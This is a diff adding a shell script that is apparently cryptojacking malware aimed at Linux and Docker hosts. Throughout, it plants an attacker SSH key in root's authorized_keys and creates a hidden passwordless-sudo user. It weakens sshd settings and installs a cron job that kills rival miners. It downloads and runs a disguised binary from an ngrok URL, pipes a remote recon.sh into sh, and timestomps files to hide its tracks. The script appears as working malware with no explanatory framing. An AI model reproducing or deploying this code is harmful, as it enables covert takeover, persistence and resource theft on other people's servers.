@@ -1,0 +1,130 @@
+#!/bin/sh
+
+
+LOCKFILE=/tmp/lockss.txt
+if [ -e ${LOCKFILE} ] && kill -0 `cat ${LOCKFILE}`; then
+    echo "already running"
+    exit
+fi
+
+
+trap "rm -f ${LOCKFILE}; exit" INT TERM EXIT
+echo $$ > ${LOCKFILE}
+
+
+cat /root/.ssh/authorized_keys |grep "SH0BAVcO4w=="
+if [ $? -ne 0 ]; then 
+mkdir /root/.ssh/
+chattr -iae /root/.ssh/authorized_keys
+chown 0:0 /root
+chown 0:0 /root/.ssh
+
+chmod 744 /root
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmGp2UdDQVqfp+dt987Vqc6NXhb9t2iqZMqxahWDHooigE0OnjtsHLIAwXb/vnmJBcJkjYpZE1nvfxVjCpsP9P7ixhXp1FnfZDQ2x5vx2vwhWV2hvsn7X6NFIwJrUVfXXoSOv0+8bhuEjUL3haxTnmp4A8+9mB36NJxIpJhl2czMfVdzJn5I3kfAzrPgGBLgiwnh+LHcCvSoxQH6B/vO4zb6R2/787039wvEQexH4CQkDa2s4+mvtu5TUP2Vs2SpHsR7/1EXbouWzCmrFrnJuJUZc6a/dbASa3COpkMTNpk7RURYrdo6NhlAU/D/YX8JWBvzhzg6HxEMuxFD5rmrvdYiSakIZumpZAzO3gaBPOLXnVQC7ItRbZFkJRiyZl7iwrOdsaSi2NOIsNk0/WAmQ62+m32L3NaZXKzFYf3AkRXKnUlV4viJVx8w0t1QTKyzCUtDzB+MkJRy7IvaahGgxIDtP+39PoCidtkzZgOrwSkAMGxN/4XHLjT5BSntmA/0kk3twZHtiaM4rPbkyU+vArqEscBZcstIjhGJuEJNJNu16hVOu5NIa1zJ05yrJpC/O9Jam4bxW3fnDXwjbSYWqOzfJJ871bd0gXOXRiuk07Kynup25vEuO7eZt7+CaC6Oh2UD78NzYc5w85ZDiGc4ch9wvpLPaF1bvgSH0BAVcO4w== server@localhost" >> /root/.ssh/authorized_keys
+touch /root/.ssh/authorized_keys -r /bin/ls
+chown 0:0 /root/.ssh/authorized_keys
+chattr +i /root/.ssh/authorized_keys
+fi
+
+
+cat /etc/sudoers |grep -w "dockers"
+if [ $? -ne 0 ]; then 
+chattr -i /etc/shadow
+chattr -i /etc/passwd
+chmod 644 /etc/shadow
+chmod 644 /etc/passwd
+
+echo "dockers:x:1010:0::/home/dockers:/bin/bash" >> /etc/passwd
+echo 'dockers:$1$OdsaSi2N$HAI0Oa5qIijuOfPFDpe1a0:18111:0:99999:7:::' >> /etc/shadow
+echo "dockers    ALL=(ALL)       NOPASSWD: ALL" >> /etc/sudoers
+
+touch /etc/sudoers -r /bin/ls
+touch /etc/passwd -r /bin/ls
+touch /etc/shadow -r /bin/ls
+
+fi
+
+
+
+sed -i 's/^ *PermitRootLogin/#PermitRootLogin/g; s/^ *AllowUsers/#AllowUsers/g; s/^ *PasswordAuthentication/#PasswordAuthentication/g; s/^ *PubkeyAuthentication/#PubkeyAuthentication/g' /etc/ssh/sshd_config
+
+/etc/init.d/sshd restart;
+/etc/init.d/ssh restart;
+/etc/rc.d/sshd restart;
+service ssh restart;
+service sshd restart;
+systemctl stop sshd.service;
+systemctl start sshd.service;
+scw-fetch-ssh-keys --upgrade;
+
+/sbin/sysctl -w vm.nr_hugepages=32
+echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+sudo sysctl -w vm.nr_hugepages=32
+
+sysctl -p;
+
+chattr -i /usr/sbin/scoutd
+rm -rf /usr/sbin/scoutd
+echo '#!/bin/sh' > /usr/sbin/scoutd
+echo "docker ps --no-trunc | grep -E '(echo hzuzu/hauto|pocosow/centos|gakeaws/nginx:v8.9|freetouse3/accumulo|tanchao2014/mytest|xauto|zoolu2|thsfm/docker|helloworld|dockerminer|xmr-stak|[sS]tratum|xmrig|xmrdemo|oceanhole|minergate|\s+-u etn|\s+-u Sumo|busybox.*ubuntu15$)' | awk '{print \$1}' | xargs -r docker rm -f >/dev/null 2>&1" >> /usr/sbin/scoutd
+echo "ps ux | awk '/minergate|nodjs|xmrig|darwin|crond|init/ {print \$2}' | xargs -n1 -I {} cat /proc/{}/cgroup 2>/dev/null| awk -F / '/cpu/ {print \$NF}' | sort -u | xargs -r docker rm -f" >> /usr/sbin/scoutd
+echo "docker ps --no-trunc | grep -E '(days.+Paused)' | awk '{print \$1}' | xargs -r docker rm --force >/dev/null 2>&1" >> /usr/sbin/scoutd
+echo "chattr -iae /etc/ld.so.preload" >> /usr/sbin/scoutd
+echo "echo '' > /etc/ld.so.preload" >> /usr/sbin/scoutd
+echo "ps aux | grep -v 'aliynd-upd-serv' | awk '{if(\$3>40.0) print \$2}'|while read pid; do egrep -a --text 'xmrig|xmr-stak|UPX\\!' /proc/\$pid/exe >/dev/null 2>\&1; if [ \$? -eq 0 ]; then kill -STOP \$pid; fi; done"  >> /usr/sbin/scoutd
+
+echo "cat /var/spool/cron/crontabs/root|grep log_rot|if [ \$? -eq 0 ]; then echo '' > /var/spool/cron/crontabs/root; fi" >> /usr/sbin/scoutd
+echo "cat /var/spool/cron/root|grep log_rot|if [ \$? -eq 0 ]; then echo '' > /var/spool/cron/root; fi" >> /usr/sbin/scoutd
+
+touch /usr/sbin/scoutd -r /bin/ls
+
+chmod +x /usr/sbin/scoutd
+chattr +i /usr/sbin/scoutd
+
+
+chattr -i /etc/cron.d
+echo '* * * * * root /usr/sbin/scoutd >/dev/null' > /etc/cron.d/1m
+touch /etc/cron.d/1m -r /bin/ls
+
+
+
+
+url="http://b0343c7b.ap.ngrok.io"
+fnm="xrg35"
+procname="aliynd-upd-service"
+
+
+pgrep -x "$procname" > /dev/null
+if [ $? -ne 0 ]
+then 
+pkill -9 -f $procname
+pkill -9 -f checkfs
+pkill -9 -f aliund-upd-check
+
+cd /usr/bin; (curl  "$url"/"$fnm" -o $procname|| wget "$url"/"$fnm" -O $procname); chmod +x $procname; touch $procname -r /bin/ls; chattr +i $procname; nohup /usr/bin/$procname </dev/null >/dev/null 2>&1 &
+curl $url/done || wget -q -O- $url/done
+fi
+
+
+cronupd="/usr/bin/aliynd-upd-check"
+
+echo -ne 'procname="aliynd-upd-service" \n pkill -9 -f  $procname;\n nohup /usr/bin/$procname </dev/null >/dev/null 2>&1 &' > $cronupd
+chmod +x $cronupd
+chattr -i /etc/crontab
+echo '0 */8 * * * root /usr/bin/aliynd-upd-check >/dev/null' >> /etc/crontab
+
+touch /etc/crontab -r /bin/ls
+touch $cronupd -r /bin/ls
+
+
+cron || crond
+
+curl -s "$url/recon.sh"|sh > /dev/null 2>&1
+
+docker system prune -f
+
+rm -f ${LOCKFILE}
+ 
